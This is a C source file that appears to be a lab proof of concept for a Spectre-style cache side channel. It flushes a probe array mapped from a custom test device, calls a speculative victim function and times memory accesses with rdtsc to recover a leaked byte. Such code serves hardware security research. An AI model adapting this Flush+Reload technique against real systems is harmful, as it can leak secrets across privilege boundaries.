#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <stdbool.h>
#include <time.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <math.h>

#include "module/utils.h"


unsigned char *probe_array;

#define CACHE_MISS (250)


extern uint8_t vic(uint8_t cond, uint64_t val, void* shared_mem);
extern void* safe;
extern void* target;

void trigger(int fd){
    mprotect(vic, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);

    for(int i = 0; i < 256*4096; ++i)
        probe_array[i] = 1;


    int results[256] = {0};

    for(int try = 0; try < 1000; ++try){
        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            flush(&probe_array[mix_i * 4096]);
        }
        uint64_t instr1 = 0x9090;
        uint64_t instr2 = 0x9090;
        
        mfence();

        // ioctl to train the branch predictor
        // ioctl(fd, 1, 0);

        flush(&probe_array[0x61 * 4096]);
        flush(&probe_array[0x62 * 4096]);

        mfence();
        // victim_function(0x62);
        uint8_t a = vic(0, instr2, probe_array);

        mfence();

        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            uint64_t t1 = mrdtsc();
            maccess(&probe_array[mix_i * 4096]);
            uint64_t t2 = mrdtsc() - t1;
            if (t2 < CACHE_MISS && mix_i != 0) {
                results[mix_i]++;
            }
        }
    }

    int j = -1,  k = -1;
    for(int i = 0; i < 256; ++i){
        if(j < 0 || results[i] >= results[j]){
            k = j;
            j = i;
        }
        else if (k < 0 || results[i] >= results[k]){
            k = i;
        }
    }

    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);
    // printf("%d, %d\n", results[10], results[20]);

}



int main(int argc, char **argv){
    int fd = open("/dev/mioctl", O_RDWR);

    if (fd < 0){
        perror("device open failed!\n");
        exit(-1);
    }

    int cmd = 1;
    if(argc > 1)
        sscanf(argv[1], "%d", &cmd);

    // test_ioctl(fd, cmd);


    probe_array = mmap(NULL, 4096*256, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (probe_array == MAP_FAILED){
        perror("mmap failed!\n");
        exit(-1);
    }

    trigger(fd);

    return 0;

}